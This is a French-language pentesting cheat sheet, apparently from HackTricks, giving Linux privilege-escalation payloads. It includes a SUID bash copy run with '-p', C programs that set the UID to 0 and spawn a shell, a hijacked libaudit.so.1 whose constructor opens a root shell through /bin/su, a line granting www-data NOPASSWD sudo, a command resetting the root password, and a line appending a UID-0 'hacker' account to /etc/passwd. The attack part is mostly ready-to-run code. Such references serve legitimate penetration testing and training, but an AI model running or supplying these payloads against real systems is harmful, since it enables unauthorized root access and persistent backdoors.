# Payloads à exécuter

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` active le mode privilégié : lorsque Bash démarre avec des identifiants réels et effectifs différents, il ne réinitialise pas l’identifiant effectif pour utiliser l’identifiant réel. Le shell résultant dépend toujours des identifiants existants de l’appelant.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid` modifie les identifiants réel, effectif et sauvegardé lorsque cela est autorisé, tandis que `setuid` modifie l’identifiant effectif et peut également définir les identifiants réel et sauvegardé pour un appelant privilégié. `execve` remplace l’image du processus actuel par le programme demandé.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> Ces exemples omettent la vérification des valeurs de retour ; les deux appels liés aux identifiants peuvent échouer même pour l’UID 0.<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Écraser un fichier pour escalader les privilèges

### Fichiers courants

Voici des fichiers et interfaces courants de contrôle des privilèges locaux : `/etc/passwd` stocke les enregistrements de comptes à sept champs, `/etc/shadow` stocke éventuellement les données de mots de passe chiffrées, `sudoers` définit les privilèges sudo et des tags tels que `NOPASSWD`, et le endpoint daemon par défaut de Docker est un socket Unix situé à `/var/run/docker.sock` ; l'accès à ce socket peut donner un contrôle de niveau root sur son hôte.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Ajouter un utilisateur avec un mot de passe dans _/etc/passwd_
- Modifier le mot de passe dans _/etc/shadow_
- Ajouter un utilisateur aux sudoers dans _/etc/sudoers_
- Abuser de Docker via le socket Docker, généralement situé dans _/run/docker.sock_ ou _/var/run/docker.sock_

### Écraser une bibliothèque

Vérifier quelles bibliothèques partagées un binaire utilise ; dans cet exemple, inspecter `/bin/su` avec `ldd`.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd` affiche les dépendances des objets partagés, tandis que le linker dynamique utilise les métadonnées ELF et ses règles de recherche pour les charger à l’exécution.<sup>[[9]](#references)[[10]](#references)</sup>

Pour examiner un candidat, utilisez `objdump -T` afin d’afficher la table des symboles dynamiques de `su` et de filtrer les noms d’audit.<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_user_message` et `audit_log_acct_message` sont des fonctions de libaudit ; `audit_fd` est présenté comme un objet de données défini dans la section `.bss` de `su` dans cette sortie.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Une bibliothèque de remplacement doit exporter des définitions compatibles pour les symboles non définis que le loader résout ; des ABI de fonctions/données incompatibles peuvent tout de même entraîner l'échec du processus lors de la relocation ou de l'appel de ces symboles.<sup>[[10]](#references)[[11]](#references)</sup>

L'attribut `constructor` de GCC fait automatiquement appeler `inject` avant `main` sur les cibles prises en charge.<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Si le remplacement est chargé avec succès par un processus privilégié **`/bin/su`**, ce constructeur peut démarrer **`/bin/bash`** avec les privilèges de ce processus ; le résultat exact dépend de l'environnement.<sup>[[10]](#references)[[15]](#references)</sup>

## Scripts

Pouvez-vous faire exécuter quelque chose par root ?

`sudoers` utilise la balise `NOPASSWD` dans les entrées de policy, `chpasswd` lit les paires `user:password` depuis l'entrée standard, et `/etc/passwd` utilise sept champs de compte séparés par des deux-points ; les exemples suivants supposent que les fichiers concernés sont accessibles en écriture par le processus qui les exécute.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data vers sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Modifier le mot de passe root**
```bash
echo "root:hacked" | chpasswd
```
### Ajouter un nouvel utilisateur root à /etc/passwd

Le payload final dépend d'une cible qui accepte le hash `crypt` généré : le `mkpasswd -m sha-512` de Debian correspond à SHA-512 crypt (`$6$`), tandis que `passwd -1 -salt` d'OpenSSL utilise l'algorithme BSD basé sur MD5 (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [L'élément intégré set (Manuel de référence de Bash)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — Page de manuel Linux](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — Page de manuel Linux](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — Page de manuel Linux](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — Page de manuel Linux](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Pages de manuel Debian](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Protéger le socket du daemon Docker](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Documentation Docker](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — Page de manuel Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (Utilitaires binaires GNU)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Pages de manuel Debian](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Pages de manuel Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Pages de manuel Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Attributs courants (Utilisation de la collection de compilateurs GNU)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Sources Debian](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — Documentation OpenSSL](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
